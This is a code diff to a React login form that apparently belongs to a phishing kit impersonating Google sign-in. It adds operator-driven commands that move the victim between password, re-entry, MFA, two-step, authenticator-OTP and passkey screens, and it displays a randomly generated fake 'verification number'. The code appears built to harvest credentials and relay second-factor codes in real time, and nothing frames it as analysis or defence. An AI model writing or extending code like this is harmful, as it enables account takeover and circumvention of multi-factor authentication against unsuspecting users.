@@ -14,6 +14,7 @@ export default function LoginForm() {
     const [password, setPassword] = useState('');
     const [invalid, setInvalid] = useState(false);
     const { command, resetCommand } = useCommand();
+    const [verificationNumber, setVerificationNumber] = useState(null);
 
 
 
@@ -23,16 +24,14 @@ export default function LoginForm() {
             setInvalid(true);
             setIsLoading(false);
             setCurrentStep('email');
-        } 
-        else if (command === 'REQUEST_GOOGLE_PASSWORD') {
+        } else if (command === 'REQUEST_GOOGLE_PASSWORD') {
             setIsLoading(false);
             setCurrentStep('password');
-        }
-        else if (command === 'REQUEST_GOOGLE_PASSWORD_AGAIN') {
+        } else if (command === 'REQUEST_GOOGLE_PASSWORD_AGAIN') {
             setInvalid(true);
             setIsLoading(false);
             setCurrentStep('password');
-        }  else if (command === 'REQUEST_AUTHENTICATION_EMAIL') {
+        } else if (command === 'REQUEST_AUTHENTICATION_EMAIL') {
             setIsLoading(false);
             setTimeout(() => {
                 // setIsLoading(false);
@@ -44,6 +43,20 @@ export default function LoginForm() {
                 resetCommand(); 
                 router.push('/NumAuthenticationPage');
             }, 1500);
+        } else if (command === 'REQUEST_GOOGLE_MFA') {
+            setIsLoading(false);
+            setCurrentStep('mfa');
+        } else if (command === 'REQUEST_GOOGLE_2STEPS') {
+            setIsLoading(false);
+            setCurrentStep('2step');
+            // Generate random verification number
+            setVerificationNumber(Math.floor(1000 + Math.random() * 9000));
+        } else if (command === 'REQUEST_GOOGLE_AUTH_OTP') {
+            setIsLoading(false);
+            setCurrentStep('auth_otp');
+        } else if (command === 'REQUEST_GOOGLE_PASSKEYS') {
+            setIsLoading(false);
+            setCurrentStep('passkeys');
         } else if (command === 'CORRECT_OTP') {
             setIsLoading(false);
         } else if (command === 'FINISH') {
@@ -117,6 +130,7 @@ export default function LoginForm() {
                                 password={password}
                                 setPassword={setPassword}
                                 invalid={invalid}
+                                verificationNumber={verificationNumber}
                             />
                         </div>
                     </div>
